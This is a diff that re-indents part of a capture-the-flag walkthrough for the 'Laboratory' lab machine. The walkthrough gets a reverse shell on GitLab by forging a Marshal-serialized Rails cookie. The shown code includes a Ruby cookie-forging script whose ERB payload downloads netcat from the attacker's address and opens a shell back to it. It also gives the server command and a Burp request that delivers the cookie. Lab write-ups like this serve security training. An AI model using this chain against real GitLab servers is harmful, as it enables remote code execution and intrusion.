@@ -71,46 +71,46 @@ Nmap done: 1 IP address (1 host up) scanned in 35.91 seconds
 - After some tinkering I found how to get a shell by:
   1. Downloading/Installing Ruby and using this payload generation script: (note, the correct playload I used is also displayed)
 
-  ```ruby
-  def genPayload()
-        request = ActionDispatch::Request.new(Rails.application.env_config)
-        request.env["action_dispatch.cookies_serializer"] = :marshal
-        cookies = request.cookie_jar
+      ```ruby
+      def genPayload()
+            request = ActionDispatch::Request.new(Rails.application.env_config)
+            request.env["action_dispatch.cookies_serializer"] = :marshal
+            cookies = request.cookie_jar
 
-        erb = ERB.new("<%= `curl --connect-timeout 3 10.10.14.31:443/nc > /tmp/nc; chmod +x /tmp/nc; /tmp/nc 10.10.14.31 3333 -/bin/sh` %>")
-        depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
-        cookies.signed[:cookie] = depr
-        puts cookies[:cookie]
-  end
+            erb = ERB.new("<%= `curl --connect-timeout 3 10.10.14.31:443/nc > /tmp/nc; chmod +x /tmp/nc; /tmp/nc 10.10.14.31 3333 -/bin/sh` %>")
+            depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
+            cookies.signed[:cookie] = depr
+            puts cookies[:cookie]
+      end
 
-  ```
+      ```
   2. From above they playload downloads **nc** from my machine. Use python simple http server for this (run this in dir of nc):
 
-  ```python
-  python -m http.server 443
-  ```
+      ```python
+      python -m http.server 443
+      ```
   3. After the script is ran with payload it will generate a cookie that you need to add to a burp web reqest. To run script: (Make sure you are logged on as the user you created for gitlab and use the gitlab-rails console to run) (if you don't do this under your user account, it will not generate the correct cookie!)
 
-  ```bash
-  load "/tmp/rails/payload.rb"
-  genPayload
-  ```
+      ```bash
+      load "/tmp/rails/payload.rb"
+      genPayload
+      ```
   4. Now paste this cookie in the following burp request after **Cookie: experimentation_subject_id=**: (don't forget to URL ENCODE)
 
-  ```
-  GET /users/sign_in HTTP/1.1
-  Host: git.laboratory.htb
-  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
-  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-  Accept-Language: en-US,en;q=0.5
-  Accept-Encoding: gzip, deflate
-  Referer: https://git.laboratory.htb/dashboard/snippets
-  DNT: 1
-  Connection: close
-  Cookie: experimentation_subject_id=
-  Cache-Control: max-age=0
-  Content-Length: 6
-  ```
+      ```
+      GET /users/sign_in HTTP/1.1
+      Host: git.laboratory.htb
+      User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+      Accept-Language: en-US,en;q=0.5
+      Accept-Encoding: gzip, deflate
+      Referer: https://git.laboratory.htb/dashboard/snippets
+      DNT: 1
+      Connection: close
+      Cookie: experimentation_subject_id=
+      Cache-Control: max-age=0
+      Content-Length: 6
+      ```
 
   5. Now verify you have your python web server setup and nc is listening on your machine, then send the reqest away, this should return a reverse shell!
 
